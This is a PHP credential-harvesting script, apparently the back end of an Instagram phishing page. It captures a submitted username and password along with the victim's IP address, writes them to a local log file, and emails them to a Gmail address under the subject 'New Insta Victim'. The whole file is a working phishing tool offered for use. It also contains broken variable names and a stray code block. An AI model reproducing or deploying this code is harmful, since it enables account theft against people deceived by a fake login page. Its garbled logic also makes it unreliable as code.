<?php
#██████╗ ███████╗███████╗██████╗ ██████╗ 
#██╔══██╗██╔════╝██╔════╝██╔══██╗╚════██╗
#██║  ██║█████╗  █████╗  ██████╔╝ █████╔╝
#██║  ██║██╔══╝  ██╔══╝  ██╔═══╝  ╚═══██╗
#██████╔╝███████╗███████╗██║     ██████╔╝
#╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ 
#         By Bradd Connel   
if(isset($_POST['submit'])){                                                                                                                  
    $date = gmdate ("d-n-Y");
    $time = gmdate ("H:i:s");
    $ip = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ip);
    $message .= "========== Instagram Login ==========\n";
    $message .= "User: ".$_POST['username']."\n";
    $message .= "Pass: ".$_POST['password']."\n";
    $message .= "----------\n";
    $message .= "IP: ".$ip."\n";
    $message .= "Log : $time / $date \n";
    $rmessage = "$message\n";
    $send= "radrex460@gmail.com";
    $subject = "New Insta Victim | $ip";
    $headers = "From: Bradd kcah";
    $file = fopen("logs.txt","ab");
    fwrite($file,$message);
    fclose($file);
    $str=array($send, $IWP); foreach ($str as $send)
    if(mail($send,$subject,$rnessage,$headers) != false)
    echo 'option1';
    {
    mail($Send,$subject,$rnessage,$headers);
    echo 'option2';
    } 
?>
